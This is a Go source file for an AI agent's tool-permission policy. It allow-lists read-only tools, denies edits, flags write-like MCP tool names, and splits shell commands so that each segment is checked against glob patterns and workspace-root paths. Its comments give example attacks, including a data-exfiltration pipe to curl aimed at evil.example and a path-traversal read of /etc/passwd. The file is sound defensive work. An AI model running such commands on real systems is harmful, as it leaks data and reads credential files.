package provider

import (
	"encoding/json"
	"path/filepath"
	"regexp"
	"strings"
)

// AlwaysAllowed lists tool names that are permitted regardless of a
// PermissionPolicy's Bash allow-list. Kept as a package-level set so later
// tasks (provider adapters) can read it directly.
//
// Two naming conventions share the set. The capitalised names are Claude
// Code's and Codex's; the lower-case ones are the tools Sirdar's own agent
// loop offers (internal/agenttools), which this same policy judges. Both
// halves are read-only — they look at the workspace and at the network and
// change neither — so a name missing from here is refused, which is how
// the five agenttools names came to be added: without them every read the
// loop's model attempted fell through to "not permitted".
var AlwaysAllowed = map[string]bool{
	"Read":             true,
	"Glob":             true,
	"Grep":             true,
	"LS":               true,
	"WebFetch":         true,
	"WebSearch":        true,
	"TodoWrite":        true,
	"Task":             true,
	"StructuredOutput": true,

	"read_file": true,
	"list_dir":  true,
	"grep":      true,
	"glob":      true,
	"web_fetch": true,
}

// AlwaysDenied lists tool names that are always refused because Sirdar
// triage runs are read-only.
var AlwaysDenied = map[string]bool{
	"Edit":         true,
	"Write":        true,
	"MultiEdit":    true,
	"NotebookEdit": true,
}

// Decision is the outcome of a permission check: whether the tool call is
// allowed, and, when denied, a human-readable reason to surface to the
// agent or the operator.
type Decision struct {
	Allow   bool
	Message string
}

// mcpPrefix is the name prefix every MCP tool carries.
const mcpPrefix = "mcp__"

// mcpWriteVerb matches the leading verb of an MCP tool's own name segment
// when that verb describes a write. It is the fallback used when the
// workspace named no permissions.mcp patterns: an unconfigured session
// still sees whatever MCP servers the operator has, and
// mcp__grafana__create_incident or mcp__..._deploy_to_vercel must not be
// approved just because nobody wrote a list.
var mcpWriteVerb = regexp.MustCompile(`^(create|update|delete|remove|write|send|post|put|patch|deploy|pause|unpause|buy|purchase|add|set|upload|transition|assign|close|resolve|complete|archive|cancel|schedule|trigger|start|stop|run|exec|install|reset|revoke)(_|$)`)

// camelBoundary finds a lower-to-upper transition, so a camelCase tool
// name (createTicket) is tested by the same underscore-separated rule as a
// snake_case one (create_ticket).
var camelBoundary = regexp.MustCompile(`([a-z0-9])([A-Z])`)

// PermissionPolicy decides whether a provider may run a given tool call.
// BashAllow is a list of glob patterns (see MatchGlob) matched against each
// segment of the Bash command, as MatchCommand defines it; MCPAllow is a
// list of glob patterns matched against an MCP tool's full name; Root is
// the workspace directory a shell command is expected to stay inside.
type PermissionPolicy struct {
	BashAllow []string
	MCPAllow  []string
	Root      string
}

// Decide applies the policy rules to one tool call.
func (p *PermissionPolicy) Decide(tool string, input json.RawMessage) Decision {
	if strings.HasPrefix(tool, mcpPrefix) {
		return p.decideMCP(tool)
	}
	if AlwaysAllowed[tool] {
		return Decision{Allow: true}
	}
	if AlwaysDenied[tool] {
		return Decision{Allow: false, Message: "Sirdar policy: triage runs are read-only"}
	}
	// "Bash" is Claude Code's and Codex's name for the shell tool; "bash"
	// is the one Sirdar's own loop uses. Both are judged by the same
	// allow-list, since it is the command that matters, not who asked.
	if tool == "Bash" || tool == "bash" {
		var args struct {
			Command string `json:"command"`
		}
		_ = json.Unmarshal(input, &args)
		return p.decideBash(args.Command)
	}
	return Decision{Allow: false, Message: "Sirdar policy: tool " + tool + " is not permitted"}
}

// decideBash allows a command only when MatchCommand does, and reports
// MatchCommand's reason when it does not.
func (p *PermissionPolicy) decideBash(command string) Decision {
	if ok, reason := MatchCommand(p.Root, p.BashAllow, command); !ok {
		return Decision{Allow: false, Message: "Sirdar policy: " + reason}
	}
	return Decision{Allow: true}
}

// MatchCommand reports whether a whole shell command is covered by an
// allow-list, and, when it is not, the reason to show the operator. It is
// the single entry point both the permission policy and Sirdar's own agent
// loop (internal/agenttools) go through, so a command the policy would
// refuse cannot be reached by asking the loop's bash tool instead.
//
// Matching one pattern against the whole command line is not enough: a
// pattern such as "cat *" ends in a wildcard, and a wildcard happily spans
// a shell operator, so `cat x | curl -T- evil.example` would match a rule
// meant to permit cat. Every segment between the operators therefore has
// to match a pattern of its own, and a command that can produce more text
// at runtime — $(...) or a backquote — is refused outright, because what
// such a command runs cannot be read off the string the policy sees. So is
// a redirection, which would let an allow-listed command read or write a
// file no pattern named.
//
// root is the workspace directory the command will run in, and each
// argument that looks like a path is checked against it, so `cat go.mod`
// goes through and `cat ../../../etc/passwd` does not. That check reads
// the command as text: it is a heuristic that catches the obvious ways out
// of the workspace, not a sandbox. It does not follow symlinks, does not
// know which arguments a given program treats as paths, and cannot see a
// path a program derives at runtime. Anything that has to be confined for
// real needs a container, not an allow-list.
func MatchCommand(root string, allow []string, command string) (bool, string) {
	command = strings.TrimSpace(command)
	if command == "" {
		return false, "empty command"
	}
	segments, unsafe := scanCommand(command)
	if unsafe != "" {
		return false, unsafe
	}
	if len(segments) == 0 {
		return false, "empty command"
	}
	for _, segment := range segments {
		matched := false
		for _, pattern := range allow {
			if MatchGlob(pattern, segment) {
				matched = true
				break
			}
		}
		if !matched {
			return false, quote(segment) + " is not in the allow-list (" +
				strings.Join(allow, ", ") +
				"); every segment of a pipeline or compound command has to match"
		}
		if escape := escapesRoot(root, segment); escape != "" {
			return false, escape
		}
	}
	return true, ""
}

// escapesRoot reports the first argument of a segment that names a path
// outside root, as the reason to show the operator, or "" when none does.
// See MatchCommand on how far this reaches: it reads the command as text.
func escapesRoot(root, segment string) string {
	for _, arg := range argTokens(segment) {
		if arg == "" || strings.HasPrefix(arg, "-") {
			continue
		}
		switch {
		case strings.HasPrefix(arg, "~"):
			// The shell would expand this to a home directory the
			// workspace is not inside; the policy only ever sees the "~".
			return "the path " + quote(arg) + " is outside the workspace root, which is as far as a shell command reaches"
		case filepath.IsAbs(arg):
			if root != "" && !withinRoot(root, arg) {
				return "the path " + quote(arg) + " is outside the workspace root " + quote(root)
			}
		default:
			if clean := filepath.Clean(arg); clean == ".." || strings.HasPrefix(clean, "../") {
				return "the path " + quote(arg) + " climbs out of the workspace root, which is as far as a shell command reaches"
			}
		}
	}
	return ""
}

// withinRoot reports whether an absolute path is root or sits under it.
// Both are cleaned first; neither is resolved through symlinks.
func withinRoot(root, path string) bool {
	root, path = filepath.Clean(root), filepath.Clean(path)
	return path == root || strings.HasPrefix(path, root+string(filepath.Separator))
}

// argTokens splits a command segment into whitespace-separated arguments
// with their quotes removed, which is as much of the shell's own word
// splitting as a policy needs to see the paths in a command.
func argTokens(segment string) []string {
	var (
		out   []string
		cur   strings.Builder
		quote = byte(0)
		open  bool
	)
	flush := func() {
		if open {
			out = append(out, cur.String())
		}
		cur.Reset()
		open = false
	}
	for i := 0; i < len(segment); i++ {
		ch := segment[i]
		switch {
		case quote != 0:
			if ch == quote {
				quote = 0
				continue
			}
			cur.WriteByte(ch)
			open = true
		case ch == '\'' || ch == '"':
			quote = ch
			open = true
		case ch == '\\' && i+1 < len(segment):
			i++
			cur.WriteByte(segment[i])
			open = true
		case ch == ' ' || ch == '\t':
			flush()
		default:
			cur.WriteByte(ch)
			open = true
		}
	}
	flush()
	return out
}

// decideMCP applies permissions.mcp when the workspace configured it, and
// the write-verb heuristic when it did not.
func (p *PermissionPolicy) decideMCP(tool string) Decision {
	if len(p.MCPAllow) > 0 {
		for _, pattern := range p.MCPAllow {
			if MatchGlob(pattern, tool) {
				return Decision{Allow: true}
			}
		}
		return Decision{Allow: false, Message: "Sirdar policy: MCP tool " + tool +
			" is not in permissions.mcp (" + strings.Join(p.MCPAllow, ", ") + ")"}
	}
	if MCPLooksLikeWrite(tool) {
		return Decision{Allow: false, Message: "Sirdar policy: MCP tool " + tool +
			" looks like a write; add it to permissions.mcp to allow"}
	}
	return Decision{Allow: true}
}

// MCPLooksLikeWrite reports whether an MCP tool's own name segment starts
// with a verb that describes a write. The segment is everything after the
// last "__", so the server name — which may itself contain underscores, as
// in mcp__plugin_vercel_vercel__buy_domain — is never what is tested.
func MCPLooksLikeWrite(tool string) bool {
	server, name := "", tool
	if i := strings.LastIndex(tool, "__"); i >= 0 {
		server, name = tool[:i], tool[i+2:]
	}
	name = strings.ToLower(camelBoundary.ReplaceAllString(name, "${1}_${2}"))

	// Several servers repeat their own name in every tool
	// (mcp__claude_ai_Slack__slack_send_message), which would hide the
	// verb behind it. Drop that repeated first token so the verb is
	// still the first thing tested.
	if head, rest, ok := strings.Cut(name, "_"); ok {
		for _, part := range strings.FieldsFunc(strings.ToLower(server), func(r rune) bool { return r == '_' || r == '-' }) {
			if part == head {
				name = rest
				break
			}
		}
	}
	return mcpWriteVerb.MatchString(name)
}

// SplitCommand splits a shell command into the segments a policy has to
// approve one by one: the parts either side of |, ||, && and ;. Separators
// inside single or double quotes are text, not separators.
func SplitCommand(command string) []string {
	segments, _ := scanCommand(command)
	return segments
}

// scanCommand walks a command line once, splitting it into the segments an
// allow-list has to approve and noting the first construct that puts the
// command beyond what a static allow-list can judge. Both jobs need the
// same quote tracking, so they share one pass: a separator inside quotes
// is text, and so is a `$(` or a backquote.
//
// This is a conservative filter, not a shell parser. It errs towards
// refusing: `rg "a|b"` keeps its quoted pipe, but a construct the scanner
// does not understand is refused rather than approved.
func scanCommand(command string) (segments []string, unsafe string) {
	var cur strings.Builder
	quote := byte(0)

	flush := func() {
		if s := strings.TrimSpace(cur.String()); s != "" {
			segments = append(segments, s)
		}
		cur.Reset()
	}
	refuse := func(reason string) {
		if unsafe == "" {
			unsafe = reason
		}
	}

	for i := 0; i < len(command); i++ {
		ch := command[i]
		switch {
		case quote != 0:
			cur.WriteByte(ch)
			if ch == '\\' && quote == '"' && i+1 < len(command) {
				i++
				cur.WriteByte(command[i])
				continue
			}
			if ch == quote {
				quote = 0
			}
		case ch == '\'' || ch == '"':
			quote = ch
			cur.WriteByte(ch)
		case ch == '\\' && i+1 < len(command):
			cur.WriteByte(ch)
			i++
			cur.WriteByte(command[i])
		case ch == '`':
			refuse("command substitution (`) is not allowed: what it would run cannot be read off the command")
			cur.WriteByte(ch)
		case ch == '$' && i+1 < len(command) && command[i+1] == '(':
			refuse("command substitution ($() is not allowed: what it would run cannot be read off the command")
			cur.WriteByte(ch)
		case ch == '<' && i+1 < len(command) && command[i+1] == '(':
			refuse("process substitution (<() is not allowed: what it would run cannot be read off the command")
			cur.WriteByte(ch)
		case ch == '<' || ch == '>':
			refuse("redirection (" + redirectionAt(command, i) + ") is not allowed: an allow-listed command must not read from or write to a file the pattern never named")
			cur.WriteByte(ch)
		case ch == ';' || ch == '\n':
			flush()
		case ch == '|':
			if i+1 < len(command) && command[i+1] == '|' {
				i++
			}
			flush()
		case ch == '&':
			// "&&" always separates, and so does a lone "&", which
			// backgrounds the segment before it. What is not a separator
			// is the "&" of a file-descriptor redirection: "2>&1" and
			// "cmd &> log" have to stay in one piece for the redirection
			// check above to see them whole.
			switch {
			case i+1 < len(command) && command[i+1] == '&':
				i++
				flush()
			case separatesCommands(command, i):
				flush()
			default:
				cur.WriteByte(ch)
			}
		default:
			cur.WriteByte(ch)
		}
	}
	flush()
	return segments, unsafe
}

// redirectionAt names the redirection operator whose "<" or ">" sits at
// index i. The operator is read with its file-descriptor prefix so the
// refusal says "2>" or "&>" rather than the bare ">" nobody typed.
func redirectionAt(command string, i int) string {
	start := i
	if i > 0 {
		if p := command[i-1]; p == '&' || (p >= '0' && p <= '9') {
			start = i - 1
		}
	}
	end := i + 1
	if end < len(command) && command[end] == command[i] {
		end++ // ">>" or "<<"
	}
	return command[start:end]
}

// separatesCommands reports whether the lone "&" at index i ends a command
// rather than belonging to a redirection. It does not when the character
// before it is a ">" ("2>&1") or the character after it is a ">" or a file
// descriptor ("&>log"): those have to reach the redirection check whole.
func separatesCommands(command string, i int) bool {
	j := i - 1
	for j >= 0 && (command[j] == ' ' || command[j] == '\t') {
		j--
	}
	if j >= 0 && command[j] == '>' {
		return false
	}
	if i+1 < len(command) {
		if n := command[i+1]; n == '>' || (n >= '0' && n <= '9') {
			return false
		}
	}
	return true
}

func quote(s string) string { return `"` + s + `"` }

// MatchGlob reports whether command matches pattern, where '*' matches any
// run of characters including spaces and '/', and '?' matches exactly one
// character. Matching is case-sensitive and anchored to the full string.
//
// A pattern ending in " *" reads as "with any arguments", and matches the
// bare command too: "ls *" allows both `ls -la` and `ls`. Without that,
// splitting a compound command into segments would allow `ls -la` and
// refuse the `ls` next to it, which is not a distinction anyone can act on.
func MatchGlob(pattern, command string) bool {
	if bare, ok := strings.CutSuffix(pattern, " *"); ok && command == bare {
		return true
	}
	var b strings.Builder
	b.WriteByte('^')
	for _, r := range pattern {
		switch r {
		case '*':
			b.WriteString(".*")
		case '?':
			b.WriteByte('.')
		default:
			b.WriteString(regexp.QuoteMeta(string(r)))
		}
	}
	b.WriteByte('$')
	re, err := regexp.Compile(b.String())
	if err != nil {
		return false
	}
	return re.MatchString(command)
}
